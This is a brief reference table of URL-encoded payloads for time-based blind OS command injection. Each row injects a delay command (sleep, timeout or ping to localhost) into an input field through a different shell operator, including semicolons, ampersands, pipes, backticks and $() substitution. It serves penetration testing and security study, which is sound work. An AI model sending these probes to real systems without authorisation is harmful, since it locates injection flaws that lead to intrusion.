## Payload Summary Reference Table

| Operator Type | URL-Encoded Payload | Intended Shell Behavior |
|---|---|---|
| Backticks | test%60sleep+5%60 | Executes sleep 5 inline |
| Semicolon | test%3Bsleep+5 | Terminates first string, runs sleep 5 |
| Semicolon + Comment | test%3Bsleep+5%3B%23 | Runs sleep 5 and comments out trailing code |
| Background Ampersand | test%26sleep+5 | Spawns sleep 5 as a parallel process |
| Logical AND | test%26%26sleep+5 | Runs sleep 5 if test succeeds |
| Logical OR | test%7C%7Csleep+5 | Runs sleep 5 if test fails |
| POSIX Substitution | test%24%28sleep+5%29 | Evaluates $(sleep 5) inline |
| Windows Timeout | test%26timeout+/t+5 | Pauses Windows cmd for 5 seconds |
| Windows Ping | test%26ping+-n+5+127.0.0.1 | Sends 5 pings to simulate a 4-second delay |

